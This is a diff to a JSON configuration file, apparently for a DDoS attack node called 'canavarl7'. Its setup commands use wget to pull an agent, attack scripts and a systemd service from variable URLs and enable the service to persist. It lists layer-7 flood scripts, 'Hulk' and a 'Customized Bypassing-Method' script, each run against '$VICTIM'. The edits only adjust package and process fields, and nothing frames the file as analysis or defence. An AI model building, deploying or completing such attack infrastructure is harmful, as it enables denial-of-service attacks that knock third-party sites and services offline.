@@ -1,6 +1,6 @@
 {
   "setup": {
-    "init": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python2 -y;",
+    "init": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python-pip -y;",
     "download_agent": "cd /; mkdir canavarl7; cd canavarl7; wget $AGENTLINK;",
     "download_script": "cd /canavarl7/; mkdir -p scripts; cd/canavarl7/scripts/; wget $SCRIPTLINK -O $SCRIPTNAME;",
     "service_setup": "cd /lib/systemd/system/; wget $SERVICELINK -O $SERVICENAME; systemctl daemon-reload; systemctl start $SERVICENAME; systemctl enable $SERVICENAME;",
@@ -13,6 +13,7 @@
       "id": "97ae0e0c0fd1fc7616e4ef2e190de65f",
       "name": "Hulk",
       "lang": "python",
+      "process": "python2",
       "filename": "hulk.py",
       "dictation": "python2 hulk.py $VICTIM",
       "description": "Basic L7 Script, Recommended",
@@ -22,6 +23,7 @@
       "id": "b98e97d8ba98b17c43f8b9ab1ad4837b",
       "name": "DMC",
       "lang": "python",
+      "process": "python2",
       "filename": "custommatter.py",
       "dictation": "python2 custommatter.py $VICTIM",
       "description": "Customized Bypassing-Method L7 Script",
